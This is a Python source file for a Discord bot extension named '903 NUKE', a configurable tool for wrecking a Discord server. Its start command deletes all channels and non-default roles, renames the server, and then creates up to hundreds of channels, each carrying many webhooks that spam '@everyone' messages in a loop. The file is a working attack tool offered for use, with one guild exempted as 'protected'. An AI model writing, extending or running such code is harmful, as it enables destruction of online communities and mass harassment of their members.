import discord
from discord.ext import commands
import json
import asyncio
import os

# ANSI Colors
BLACK = "\x1b[30m"
WHITE = "\x1b[37m"
RED = "\x1b[31m"

class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.webhook_spam = True
        self.config_file = "data/nuke_config.json"
        self.excluded_guilds = [1289325760040927264]
        self.default_config = {
            "webhook_message": "@everyone GG",
            "server_name": "gg",
            "webhook_delay": 0.1,
            "channel_name": "gg",
            "role_name": "ggs",
            "channel_amount": 100,
            "role_amount": 100,
            "webhook_amount": 25,
            "nuke_speed": 0.05
        }
        self.config = self.load_config()

    def load_config(self):
        os.makedirs('data', exist_ok=True)
        if os.path.exists(self.config_file):
            with open(self.config_file, 'r') as f:
                return json.load(f)
        else:
            self.save_config(self.default_config)
            return self.default_config

    def save_config(self, config):
        with open(self.config_file, 'w') as f:
            json.dump(config, f, indent=4)

    async def send_embed(self, ctx, title, description):
        await ctx.send(f"""```ansi
{BLACK}[ {RED}903 NUKE {BLACK}]
{BLACK}[{WHITE}{title}{BLACK}] {WHITE}{description}```""")

    @commands.group(invoke_without_command=True)
    async def nuke(self, ctx):
        settings = self.config
        await ctx.send(f"""```ansi
{BLACK}[ {RED}903 NUKE {BLACK}]
{BLACK}⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯

{BLACK}[{WHITE}Settings{BLACK}]
{BLACK}[{WHITE}Message{BLACK}] {WHITE}{settings['webhook_message'][:20]}...
{BLACK}[{WHITE}Name{BLACK}] {WHITE}{settings['server_name']}
{BLACK}[{WHITE}Delay{BLACK}] {WHITE}{settings['webhook_delay']}s
{BLACK}[{WHITE}Speed{BLACK}] {WHITE}{settings['nuke_speed']}s
{BLACK}[{WHITE}Channels{BLACK}] {WHITE}{settings['channel_amount']}
{BLACK}[{WHITE}Roles{BLACK}] {WHITE}{settings['role_amount']}
{BLACK}[{WHITE}Webhooks{BLACK}] {WHITE}{settings['webhook_amount']}

{BLACK}[{WHITE}Commands{BLACK}]
{BLACK}[{WHITE}1{BLACK}] {WHITE}message <text> {BLACK}- Set webhook message
{BLACK}[{WHITE}2{BLACK}] {WHITE}name <text> {BLACK}- Set server name
{BLACK}[{WHITE}3{BLACK}] {WHITE}delay <seconds> {BLACK}- Set webhook delay
{BLACK}[{WHITE}4{BLACK}] {WHITE}speed <seconds> {BLACK}- Set nuke speed
{BLACK}[{WHITE}5{BLACK}] {WHITE}channels <amount> {BLACK}- Set channel amount
{BLACK}[{WHITE}6{BLACK}] {WHITE}roles <amount> {BLACK}- Set role amount
{BLACK}[{WHITE}7{BLACK}] {WHITE}webhooks <amount> {BLACK}- Set webhook amount
{BLACK}[{WHITE}8{BLACK}] {WHITE}reset {BLACK}- Reset settings
{BLACK}[{WHITE}9{BLACK}] {WHITE}start {BLACK}- Start nuke
{BLACK}[{WHITE}0{BLACK}] {WHITE}stop {BLACK}- Stop nuke```""")

    @nuke.command()
    async def message(self, ctx, *, msg):
        self.config["webhook_message"] = msg
        self.save_config(self.config)
        await self.send_embed(ctx, "Success", "Webhook message set.")

    @nuke.command()
    async def name(self, ctx, *, name):
        self.config["server_name"] = name
        self.save_config(self.config)
        await self.send_embed(ctx, "Success", "Server name set.")

    @nuke.command()
    async def speed(self, ctx, speed: float):
        if speed < 0.01:
            return await self.send_embed(ctx, "Error", "Speed must be at least 0.01 seconds.")
        self.config["nuke_speed"] = speed
        self.save_config(self.config)
        await self.send_embed(ctx, "Success", f"Nuke speed set to {speed}s.")

    @nuke.command()
    async def delay(self, ctx, delay: float):
        if delay < 0.1:
            return await self.send_embed(ctx, "Error", "Delay must be at least 0.1 seconds.")
        self.config["webhook_delay"] = delay
        self.save_config(self.config)
        await self.send_embed(ctx, "Success", f"Webhook delay set to {delay}s.")

    @nuke.command()
    async def channels(self, ctx, amount: int):
        if not 1 <= amount <= 500:
            return await self.send_embed(ctx, "Error", "Channel amount must be between 1 and 500.")
        self.config["channel_amount"] = amount
        self.save_config(self.config)
        await self.send_embed(ctx, "Success", f"Channel amount set to {amount}.")

    @nuke.command()
    async def roles(self, ctx, amount: int):
        if not 1 <= amount <= 250:
            return await self.send_embed(ctx, "Error", "Role amount must be between 1 and 250.")
        self.config["role_amount"] = amount
        self.save_config(self.config)
        await self.send_embed(ctx, "Success", f"Role amount set to {amount}.")

    @nuke.command()
    async def webhooks(self, ctx, amount: int):
        if not 1 <= amount <= 50:
            return await self.send_embed(ctx, "Error", "Webhook amount must be between 1 and 50.")
        self.config["webhook_amount"] = amount
        self.save_config(self.config)
        await self.send_embed(ctx, "Success", f"Webhook amount set to {amount}.")

    @nuke.command()
    async def reset(self, ctx):
        self.config = self.default_config.copy()
        self.save_config(self.config)
        await self.send_embed(ctx, "Success", "Settings reset to default.")

    @nuke.command()
    async def stop(self, ctx):
        self.webhook_spam = False
        await self.send_embed(ctx, "Status", "Stopping all webhook spam...")

    @nuke.command()
    async def start(self, ctx):
        if ctx.guild.id in self.excluded_guilds:
            return await self.send_embed(ctx, "Error", "This server is protected.")

        await self.send_embed(ctx, "Status", "Initiating nuke sequence...")
        self.webhook_spam = True

        async def spam_webhook(webhook):
            while self.webhook_spam:
                try:
                    await webhook.send(content=self.config["webhook_message"])
                    await asyncio.sleep(self.config["webhook_delay"])
                except discord.HTTPException:
                    break

        async def create_webhook_in_channel(channel_name, number):
            try:
                channel = await ctx.guild.create_text_channel(f"{channel_name}-{number}")
                webhooks = []
                for i in range(self.config["webhook_amount"]):
                    webhook = await channel.create_webhook(name=f"SEIZED-{i+1}")
                    webhooks.append(webhook)
                await asyncio.gather(*(spam_webhook(wh) for wh in webhooks))
            except discord.Forbidden:
                pass

        # Delete all channels & roles first
        delete_tasks = []
        for channel in ctx.guild.channels:
            delete_tasks.append(channel.delete())
        for role in ctx.guild.roles:
            if role.name != "@everyone":
                delete_tasks.append(role.delete())
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        
        # Change server name
        try:
            await ctx.guild.edit(name=self.config["server_name"])
        except discord.Forbidden:
            pass
        
        # Spam create channels and webhooks
        create_tasks = [
            create_webhook_in_channel(self.config["channel_name"], i+1)
            for i in range(self.config["channel_amount"])
        ]
        await asyncio.gather(*create_tasks)

def setup(bot):
    bot.add_cog(Nuke(bot))
